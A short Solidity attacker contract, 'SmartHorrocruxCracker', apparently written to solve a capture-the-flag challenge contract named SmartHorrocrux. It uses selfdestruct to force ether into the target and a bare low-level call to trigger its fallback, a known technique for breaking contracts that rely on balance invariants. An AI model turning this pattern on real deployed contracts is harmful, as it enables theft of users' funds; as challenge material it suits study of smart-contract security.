// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./SmartHorrocrux.sol";


contract SmartHorrocruxCracker {

    SmartHorrocrux public horrocrux;
    bool internal alreadySentEth = false;

    constructor(address _horrocrux) payable {
        horrocrux = SmartHorrocrux(_horrocrux);
    }

    function fund() public payable {
        selfdestruct(payable(address(horrocrux)));
    }

    function drain() public {
        address(horrocrux).call{value: 0}("");
    }

}